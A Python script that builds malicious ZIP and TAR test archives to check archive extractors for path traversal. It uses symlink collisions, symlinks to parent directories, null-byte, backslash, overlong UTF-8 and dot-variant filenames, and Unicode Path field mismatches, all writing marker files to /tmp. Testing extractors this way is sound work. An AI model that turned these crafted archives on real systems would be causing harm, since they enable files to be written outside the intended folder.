#!/usr/bin/env python3
"""
Craft malicious test archives for security research.
Some archives are created using archive-alchemist, others require raw binary manipulation.
"""
import os
import sys
import struct
import zipfile
import tarfile
import io
import subprocess

ARCHIVE_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "archives")
TOOL = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "archive-alchemist.py")

os.makedirs(ARCHIVE_DIR, exist_ok=True)

def run_tool(args):
    """Run archive-alchemist with given arguments."""
    cmd = [sys.executable, TOOL] + args
    print(f"  CMD: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  STDERR: {result.stderr}")
    return result

###############################################################################
# Test 1: Symlink + Duplicate Filename in ZIP (symlink-then-file collision)
###############################################################################
def create_symlink_dupe_zip():
    print("\n[1] Creating symlink + duplicate filename ZIP...")
    path = os.path.join(ARCHIVE_DIR, "symlink_dupe.zip")
    if os.path.exists(path):
        os.remove(path)

    # First add a symlink entry pointing outside
    run_tool([path, "add", "config", "--symlink", "/tmp/evil_target.txt"])
    # Then add a regular file with the same name
    run_tool([path, "add", "config", "--content", "PAYLOAD_WRITTEN_THROUGH_SYMLINK"])

    # Verify
    run_tool([path, "list", "-l", "1"])
    print(f"  Created: {path}")

###############################################################################
# Test 2: Symlink + Duplicate Filename in TAR
###############################################################################
def create_symlink_dupe_tar():
    print("\n[2] Creating symlink + duplicate filename TAR...")
    path = os.path.join(ARCHIVE_DIR, "symlink_dupe.tar")
    if os.path.exists(path):
        os.remove(path)

    # First add a symlink entry
    run_tool([path, "add", "config", "--symlink", "/tmp/evil_target.txt"])
    # Then add a regular file with the same name
    run_tool([path, "add", "config", "--content", "PAYLOAD_WRITTEN_THROUGH_SYMLINK"])

    run_tool([path, "list", "-l", "1"])
    print(f"  Created: {path}")

###############################################################################
# Test 3: Symlink-to-parent directory + nested file (two-entry escape)
###############################################################################
def create_symlink_parent_zip():
    print("\n[3] Creating symlink-to-parent + nested file ZIP...")
    path = os.path.join(ARCHIVE_DIR, "symlink_parent.zip")
    if os.path.exists(path):
        os.remove(path)

    # Entry 1: symlink "escape" -> "../../../../../../"
    run_tool([path, "add", "escape", "--symlink", "../../../../../../"])
    # Entry 2: regular file "escape/tmp/evil_via_symlink.txt"
    run_tool([path, "add", "escape/tmp/evil_via_symlink.txt", "--content", "ESCAPED_VIA_SYMLINK_CHAIN"])

    run_tool([path, "list", "-l", "1"])
    print(f"  Created: {path}")

def create_symlink_parent_tar():
    print("\n[3b] Creating symlink-to-parent + nested file TAR...")
    path = os.path.join(ARCHIVE_DIR, "symlink_parent.tar")
    if os.path.exists(path):
        os.remove(path)

    # Entry 1: symlink "escape" -> "../../../../../../"
    run_tool([path, "add", "escape", "--symlink", "../../../../../../"])
    # Entry 2: regular file "escape/tmp/evil_via_symlink.txt"
    run_tool([path, "add", "escape/tmp/evil_via_symlink.txt", "--content", "ESCAPED_VIA_SYMLINK_CHAIN"])

    run_tool([path, "list", "-l", "1"])
    print(f"  Created: {path}")

###############################################################################
# Test 4: Null byte in ZIP filename (raw binary craft)
###############################################################################
def create_null_byte_zip():
    print("\n[4] Creating null byte in filename ZIP...")
    path = os.path.join(ARCHIVE_DIR, "null_byte.zip")

    # We need to craft this at the binary level since zipfile won't allow null bytes
    # Create a ZIP with filename "safe.txt\x00../../../tmp/null_evil.txt"

    content = b"NULL_BYTE_PAYLOAD"
    filename = b"safe.txt\x00../../../tmp/null_evil.txt"

    buf = io.BytesIO()

    # Local File Header
    lfh_sig = b'PK\x03\x04'
    version_needed = 20
    flags = 0
    compression = 0  # stored
    mod_time = 0x4800
    mod_date = 0x5921
    crc = zipfile.crc32(content) & 0xFFFFFFFF
    compressed_size = len(content)
    uncompressed_size = len(content)

    lfh = struct.pack('<4sHHHHHLLLHH',
        lfh_sig,
        version_needed,
        flags,
        compression,
        mod_time,
        mod_date,
        crc,
        compressed_size,
        uncompressed_size,
        len(filename),
        0  # extra field length
    )

    lfh_offset = buf.tell()
    buf.write(lfh)
    buf.write(filename)
    buf.write(content)

    # Central Directory Header
    cd_offset = buf.tell()
    cdh_sig = b'PK\x01\x02'
    version_made_by = (3 << 8) | 20  # Unix + version 2.0

    cdh = struct.pack('<4sHHHHHHLLLHHHHHLL',
        cdh_sig,
        version_made_by,
        version_needed,
        flags,
        compression,
        mod_time,
        mod_date,
        crc,
        compressed_size,
        uncompressed_size,
        len(filename),
        0,  # extra field length
        0,  # comment length
        0,  # disk number start
        0,  # internal attributes
        (0o100644 << 16),  # external attributes (Unix permissions)
        lfh_offset  # relative offset of local header
    )

    buf.write(cdh)
    buf.write(filename)

    cd_size = buf.tell() - cd_offset

    # End of Central Directory
    eocd_sig = b'PK\x05\x06'
    eocd = struct.pack('<4sHHHHLLH',
        eocd_sig,
        0,  # disk number
        0,  # disk with CD
        1,  # entries on this disk
        1,  # total entries
        cd_size,
        cd_offset,
        0   # comment length
    )
    buf.write(eocd)

    with open(path, 'wb') as f:
        f.write(buf.getvalue())

    print(f"  Created: {path}")

###############################################################################
# Test 5: Backslash path traversal in ZIP
###############################################################################
def create_backslash_zip():
    print("\n[5] Creating backslash path traversal ZIP...")
    path = os.path.join(ARCHIVE_DIR, "backslash.zip")

    # Craft ZIP with backslash path traversal
    content = b"BACKSLASH_TRAVERSAL_PAYLOAD"
    filename = b"..\\..\\..\\..\\tmp\\backslash_evil.txt"

    buf = io.BytesIO()

    lfh_sig = b'PK\x03\x04'
    version_needed = 20
    flags = 0
    compression = 0
    mod_time = 0x4800
    mod_date = 0x5921
    crc = zipfile.crc32(content) & 0xFFFFFFFF

    lfh = struct.pack('<4sHHHHHLLLHH',
        lfh_sig, version_needed, flags, compression,
        mod_time, mod_date, crc, len(content), len(content),
        len(filename), 0
    )

    lfh_offset = buf.tell()
    buf.write(lfh)
    buf.write(filename)
    buf.write(content)

    cd_offset = buf.tell()
    cdh_sig = b'PK\x01\x02'
    version_made_by = (3 << 8) | 20

    cdh = struct.pack('<4sHHHHHHLLLHHHHHLL',
        cdh_sig, version_made_by, version_needed, flags, compression,
        mod_time, mod_date, crc, len(content), len(content),
        len(filename), 0, 0, 0, 0, (0o100644 << 16), lfh_offset
    )

    buf.write(cdh)
    buf.write(filename)
    cd_size = buf.tell() - cd_offset

    eocd = struct.pack('<4sHHHHLLH',
        b'PK\x05\x06', 0, 0, 1, 1, cd_size, cd_offset, 0
    )
    buf.write(eocd)

    with open(path, 'wb') as f:
        f.write(buf.getvalue())

    print(f"  Created: {path}")

###############################################################################
# Test 6: Unicode Path extra field mismatch
###############################################################################
def create_unicode_path_zip():
    print("\n[6] Creating Unicode Path extra field mismatch ZIP...")
    path = os.path.join(ARCHIVE_DIR, "unicode_path.zip")
    if os.path.exists(path):
        os.remove(path)

    run_tool([path, "add", "safe.txt", "--content", "UNICODE_PATH_PAYLOAD",
              "--unicodepath", "../../../tmp/unicode_evil.txt"])

    run_tool([path, "list", "-ll"])
    print(f"  Created: {path}")

###############################################################################
# Test 7: Overlong UTF-8 path traversal in ZIP
###############################################################################
def create_overlong_utf8_zip():
    print("\n[7] Creating overlong UTF-8 path traversal ZIP...")
    path = os.path.join(ARCHIVE_DIR, "overlong_utf8.zip")

    content = b"OVERLONG_UTF8_PAYLOAD"

    # Overlong UTF-8 encoding of "../" :
    # '.' = 0x2E -> overlong: 0xC0 0xAE
    # '/' = 0x2F -> overlong: 0xC0 0xAF
    # So "../" becomes: C0 AE C0 AE C0 AF
    overlong_dotdotslash = b'\xc0\xae\xc0\xae\xc0\xaf'
    filename = overlong_dotdotslash * 4 + b'tmp/overlong_evil.txt'

    buf = io.BytesIO()

    crc = zipfile.crc32(content) & 0xFFFFFFFF

    lfh = struct.pack('<4sHHHHHLLLHH',
        b'PK\x03\x04', 20, 0, 0,
        0x4800, 0x5921, crc, len(content), len(content),
        len(filename), 0
    )

    lfh_offset = buf.tell()
    buf.write(lfh)
    buf.write(filename)
    buf.write(content)

    cd_offset = buf.tell()

    cdh = struct.pack('<4sHHHHHHLLLHHHHHLL',
        b'PK\x01\x02', (3 << 8) | 20, 20, 0, 0,
        0x4800, 0x5921, crc, len(content), len(content),
        len(filename), 0, 0, 0, 0, (0o100644 << 16), lfh_offset
    )

    buf.write(cdh)
    buf.write(filename)
    cd_size = buf.tell() - cd_offset

    eocd = struct.pack('<4sHHHHLLH',
        b'PK\x05\x06', 0, 0, 1, 1, cd_size, cd_offset, 0
    )
    buf.write(eocd)

    with open(path, 'wb') as f:
        f.write(buf.getvalue())

    print(f"  Created: {path}")

###############################################################################
# Test 8: Mixed slash path traversal (forward + back)
###############################################################################
def create_mixed_slash_zip():
    print("\n[8] Creating mixed slash traversal ZIP...")
    path = os.path.join(ARCHIVE_DIR, "mixed_slash.zip")

    content = b"MIXED_SLASH_PAYLOAD"
    # Mix forward and backslashes
    filename = b"foo/..\\..\\..\\..\\tmp\\mixed_evil.txt"

    buf = io.BytesIO()
    crc = zipfile.crc32(content) & 0xFFFFFFFF

    lfh = struct.pack('<4sHHHHHLLLHH',
        b'PK\x03\x04', 20, 0, 0,
        0x4800, 0x5921, crc, len(content), len(content),
        len(filename), 0
    )

    lfh_offset = buf.tell()
    buf.write(lfh)
    buf.write(filename)
    buf.write(content)

    cd_offset = buf.tell()

    cdh = struct.pack('<4sHHHHHHLLLHHHHHLL',
        b'PK\x01\x02', (3 << 8) | 20, 20, 0, 0,
        0x4800, 0x5921, crc, len(content), len(content),
        len(filename), 0, 0, 0, 0, (0o100644 << 16), lfh_offset
    )

    buf.write(cdh)
    buf.write(filename)
    cd_size = buf.tell() - cd_offset

    eocd = struct.pack('<4sHHHHLLH',
        b'PK\x05\x06', 0, 0, 1, 1, cd_size, cd_offset, 0
    )
    buf.write(eocd)

    with open(path, 'wb') as f:
        f.write(buf.getvalue())

    print(f"  Created: {path}")

###############################################################################
# Test 9: Symlink to parent + nested file in TAR (classic but test against extractors)
###############################################################################
def create_symlink_chain_tar():
    print("\n[9] Creating symlink chain TAR (symlink dir + nested write)...")
    path = os.path.join(ARCHIVE_DIR, "symlink_chain.tar")
    if os.path.exists(path):
        os.remove(path)

    # Create a tar manually for precise control
    buf = io.BytesIO()
    tar = tarfile.open(fileobj=buf, mode='w')

    # Entry 1: symlink "subdir" -> "/tmp"
    info1 = tarfile.TarInfo(name="subdir")
    info1.type = tarfile.SYMTYPE
    info1.linkname = "/tmp"
    info1.mode = 0o777
    tar.addfile(info1)

    # Entry 2: regular file "subdir/symlink_chain_evil.txt"
    content = b"SYMLINK_CHAIN_PAYLOAD"
    info2 = tarfile.TarInfo(name="subdir/symlink_chain_evil.txt")
    info2.size = len(content)
    info2.mode = 0o644
    tar.addfile(info2, io.BytesIO(content))

    tar.close()

    with open(path, 'wb') as f:
        f.write(buf.getvalue())

    print(f"  Created: {path}")

###############################################################################
# Test 10: Filename with only dots traversal variations
###############################################################################
def create_dot_variations_zip():
    print("\n[10] Creating dot variation traversal ZIPs...")

    variations = [
        ("dots_triple.zip", b".../tmp/dots_evil.txt", b"THREE_DOT_PAYLOAD"),
        ("dots_dot_slash_dot.zip", b"./.././.././../tmp/dots2_evil.txt", b"DOT_SLASH_DOT_PAYLOAD"),
        ("dots_encoded.zip", b"..%2f..%2f..%2ftmp/encoded_evil.txt", b"URL_ENCODED_PAYLOAD"),
    ]

    for fname, filename, content in variations:
        path = os.path.join(ARCHIVE_DIR, fname)
        buf = io.BytesIO()
        crc = zipfile.crc32(content) & 0xFFFFFFFF

        lfh = struct.pack('<4sHHHHHLLLHH',
            b'PK\x03\x04', 20, 0, 0,
            0x4800, 0x5921, crc, len(content), len(content),
            len(filename), 0
        )

        lfh_offset = buf.tell()
        buf.write(lfh)
        buf.write(filename)
        buf.write(content)

        cd_offset = buf.tell()

        cdh = struct.pack('<4sHHHHHHLLLHHHHHLL',
            b'PK\x01\x02', (3 << 8) | 20, 20, 0, 0,
            0x4800, 0x5921, crc, len(content), len(content),
            len(filename), 0, 0, 0, 0, (0o100644 << 16), lfh_offset
        )

        buf.write(cdh)
        buf.write(filename)
        cd_size = buf.tell() - cd_offset

        eocd = struct.pack('<4sHHHHLLH',
            b'PK\x05\x06', 0, 0, 1, 1, cd_size, cd_offset, 0
        )
        buf.write(eocd)

        with open(path, 'wb') as f:
            f.write(buf.getvalue())

        print(f"  Created: {path}")


if __name__ == "__main__":
    print("=" * 60)
    print("Crafting malicious test archives for security research")
    print("=" * 60)

    create_symlink_dupe_zip()
    create_symlink_dupe_tar()
    create_symlink_parent_zip()
    create_symlink_parent_tar()
    create_null_byte_zip()
    create_backslash_zip()
    create_unicode_path_zip()
    create_overlong_utf8_zip()
    create_mixed_slash_zip()
    create_symlink_chain_tar()
    create_dot_variations_zip()

    print("\n" + "=" * 60)
    print(f"All archives created in: {ARCHIVE_DIR}")
    print("=" * 60)
